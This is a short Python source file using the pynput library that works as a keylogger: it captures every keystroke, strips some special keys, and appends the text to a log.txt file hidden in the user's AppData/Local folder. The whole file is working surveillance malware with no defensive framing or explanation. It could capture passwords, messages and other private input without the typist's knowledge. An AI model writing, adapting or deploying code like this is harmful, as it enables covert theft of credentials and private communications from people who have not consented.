from pynput.keyboard import Listener
import os

chemin = 'C:/Users/'+os.getcwd().split('\\')[2]+'/AppData/Local/'

def write_to_file(key):
       letter = str(key)
       letter = letter.replace("'", "")
       if letter == 'Key.backspace':
              letter = ''
       if letter == 'Key.space':
              letter = ' '
       if letter == 'Key.alt_l':
              letter = ''
       if letter == 'Key.alt_r':
              letter = ''
       if letter == 'Key.shift_r':
              letter = ''
       if letter == "Key.enter":
              letter = "\n"

       with open(chemin+"log.txt", 'a') as f:
              f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()